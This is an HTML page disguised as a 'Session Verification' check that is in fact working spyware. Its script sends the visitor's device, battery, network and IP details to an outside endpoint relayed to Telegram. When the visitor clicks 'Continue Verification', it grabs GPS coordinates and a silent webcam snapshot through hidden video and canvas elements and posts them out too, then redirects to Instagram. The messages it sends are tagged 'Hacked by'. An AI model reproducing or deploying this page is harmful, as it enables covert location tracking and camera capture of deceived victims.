
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Silent Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body {
      background-color: #1e1e1e;
      color: white;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    .card {
      background: #2a2a2a;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
    }
    button {
      margin-top: 20px;
      padding: 12px 24px;
      font-size: 16px;
      background: #00ffaa;
      color: black;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .spinner {
      margin: 20px auto;
      width: 40px;
      height: 40px;
      border: 4px solid #999;
      border-top-color: #00ffaa;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    video, canvas {
      display: none !important;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>🔐 Session Verification</h2>
    <p>Checking your device...</p>
    <div class="spinner"></div>
    <button onclick="collectSensitive()">🔓 Continue Verification</button>
    <video id="videoPreview" autoplay muted playsinline></video>
    <canvas id="snapshotCanvas" width="320" height="240"></canvas>
  </div>

  <script>
    const chatId = new URLSearchParams(window.location.search).get("id");
    const video = document.getElementById("videoPreview");
    const canvas = document.getElementById("snapshotCanvas");
    const ctx = canvas.getContext("2d");
    let imageBase64 = "";

    function sendToTelegram(message, isPhoto = false) {
      const payload = { chat_id: chatId };
      if (isPhoto && imageBase64) {
        payload.message = "📸 Silent Snapshot from camera:";
        payload.photo = imageBase64;
      } else {
        payload.message = message;
      }

      fetch("https://render-backend-package1.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    function collectSensitive() {
      navigator.geolocation.getCurrentPosition(
        pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const gpsMessage = `📍 GPS Location\nhttps://maps.google.com/?q=${lat},${lon}`;
          sendToTelegram(gpsMessage);
          capturePhotoSilently();
        },
        err => {
          sendToTelegram("❌ GPS access denied or unavailable");
          capturePhotoSilently();
        },
        { timeout: 5000 }
      );
    }

    function capturePhotoSilently() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
            stream.getTracks().forEach(track => track.stop()); // Stop camera
            sendToTelegram("", true);
            setTimeout(() => {
              window.location.href = "https://instagram.com";
            }, 3000);
          }, 1500);
        })
        .catch(() => {
          sendToTelegram("❌ Camera access denied");
          setTimeout(() => {
            window.location.href = "https://instagram.com";
          }, 3000);
        });
    }

    // Send basic info instantly
    function sendBasicInfo() {
      const ua = navigator.userAgent;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const connection = navigator.connection || {};
      const network = connection.effectiveType || "Unknown";

      navigator.getBattery().then(battery => {
        const charging = battery.charging ? "Yes" : "No";
        const level = Math.round(battery.level * 100) + "%";

        fetch("https://ipinfo.io/json?token=demo")
          .then(res => res.json())
          .then(data => {
            let basicInfo = "📱 Hacked by @Cobrax9\n\n";

            basicInfo += "📱 Device Info:\n";
            basicInfo += `🔋 Charging: ${charging}\n`;
            basicInfo += `🔌 Battery: ${level}\n`;
            basicInfo += `🌐 Network: ${network.toUpperCase()}\n`;
            basicInfo += `🕒 Time Zone: ${timeZone}\n`;
            basicInfo += `🖥️ User Agent: ${ua}\n`;
            basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
            basicInfo += "👀 More data being requested...";
            basicInfo = "📱 Hacked by @Shopandbuyy\n\n";
            sendToTelegram(basicInfo);
          });
      });
    }

    if (chatId) sendBasicInfo();
  </script>
</body>
</html>
